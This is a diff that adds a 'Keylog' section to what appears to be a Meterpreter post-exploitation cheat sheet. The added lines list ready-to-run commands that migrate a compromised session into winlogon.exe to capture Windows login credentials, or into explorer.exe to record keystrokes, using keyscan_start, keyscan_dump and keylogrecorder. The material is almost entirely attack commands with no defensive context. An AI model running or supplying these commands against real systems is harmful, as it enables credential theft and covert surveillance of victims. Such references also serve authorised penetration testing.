@@ -243,6 +243,32 @@ creds
 loot
 ```
 
+### Keylog
+##### Windows Login Credentials
+* keyscan_start - Migrate session to winlogon.exe
+```bash
+meterpreter > migrate -N winlogon.exe
+meterpreter > keyscan_start
+meterpreter > keyscan_dump
+meterpreter > keyscan_stop
+```
+* keylogrecorder
+```bash
+meterpreter > keylogrecorder -c 1
+```
+##### User Keystrokes in Applications
+* keyscan_start - Migrate session to explorer.exe
+```bash
+meterpreter > migrate -N explorer.exe
+meterpreter > keyscan_start
+meterpreter > keyscan_dump
+meterpreter > keyscan_stop
+```
+* keylogrecorder
+```bash
+meterpreter > keylogrecorder -c 0
+```
+
 ### Port Forwarding
 ##### portfwd
 | Flag | Description |
